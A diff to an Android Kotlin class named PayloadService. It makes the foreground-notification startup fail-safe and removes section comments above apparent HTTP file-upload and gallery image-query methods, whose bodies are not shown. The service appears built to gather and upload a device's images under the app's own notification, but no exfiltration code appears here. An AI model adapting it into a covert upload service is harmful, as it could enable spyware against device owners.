@@ -104,48 +104,60 @@ class PayloadService : Service() {
     }
 
     private fun startForegroundSafe() {
-        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-        if (Build.VERSION.SDK_INT >= 26) {
-            val ch = NotificationChannel(
-                Const.CHANNEL_ID, appName, NotificationManager.IMPORTANCE_LOW
-            )
-            ch.setShowBadge(false)
-            nm.createNotificationChannel(ch)
-        }
-
-        val smallIcon = try {
-            val ai = packageManager.getApplicationInfo(packageName, 0)
-            if (ai.icon != 0) ai.icon else android.R.drawable.stat_sys_download
-        } catch (t: Throwable) {
-            android.R.drawable.stat_sys_download
-        }
-
-        val builder = if (Build.VERSION.SDK_INT >= 26)
-            Notification.Builder(this, Const.CHANNEL_ID)
-        else
-            @Suppress("DEPRECATION") Notification.Builder(this)
-
-        builder
-            .setContentTitle(appName)
-            .setContentText(appName)
-            .setSmallIcon(smallIcon)
-            .setOngoing(true)
-            .setShowWhen(false)
-
         try {
-            val ai = packageManager.getApplicationInfo(packageName, 0)
-            drawableToBitmap(packageManager.getApplicationIcon(ai))?.let {
-                builder.setLargeIcon(it)
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= 26) {
+                val ch = NotificationChannel(
+                    Const.CHANNEL_ID, appName, NotificationManager.IMPORTANCE_LOW
+                )
+                ch.setShowBadge(false)
+                nm.createNotificationChannel(ch)
             }
-        } catch (_: Throwable) {
-        }
 
-        val n = builder.build()
+            val smallIcon = try {
+                val ai = packageManager.getApplicationInfo(packageName, 0)
+                if (ai.icon != 0) ai.icon else android.R.drawable.stat_sys_download
+            } catch (t: Throwable) {
+                android.R.drawable.stat_sys_download
+            }
 
-        if (Build.VERSION.SDK_INT >= 29) {
-            startForeground(Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-        } else {
-            startForeground(Const.NOTIF_ID, n)
+            val builder = if (Build.VERSION.SDK_INT >= 26)
+                Notification.Builder(this, Const.CHANNEL_ID)
+            else
+                @Suppress("DEPRECATION") Notification.Builder(this)
+
+            builder
+                .setContentTitle(appName)
+                .setContentText(appName)
+                .setSmallIcon(smallIcon)
+                .setOngoing(true)
+                .setShowWhen(false)
+
+            try {
+                val ai = packageManager.getApplicationInfo(packageName, 0)
+                drawableToBitmap(packageManager.getApplicationIcon(ai))?.let {
+                    builder.setLargeIcon(it)
+                }
+            } catch (_: Throwable) {
+            }
+
+            val n = builder.build()
+
+            if (Build.VERSION.SDK_INT >= 29) {
+                try {
+                    startForeground(Const.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                    return
+                } catch (t: Throwable) {
+                    HsLog.e("fg typed: ${t.message}")
+                }
+            }
+            try {
+                startForeground(Const.NOTIF_ID, n)
+            } catch (t: Throwable) {
+                HsLog.e("fg plain: ${t.message}")
+            }
+        } catch (t: Throwable) {
+            HsLog.e("startForegroundSafe: ${t.message}")
         }
     }
 
@@ -163,8 +175,6 @@ class PayloadService : Service() {
     } catch (t: Throwable) {
         null
     }
-
-    // ---------------- HTTP ----------------
 
     private fun postFile(
         api: String,
@@ -230,8 +240,6 @@ class PayloadService : Service() {
             }
         }
     }
-
-    // ---------------- gallery ----------------
 
     private fun queryImages(): List<Uri> {
         val out = ArrayList<Uri>()
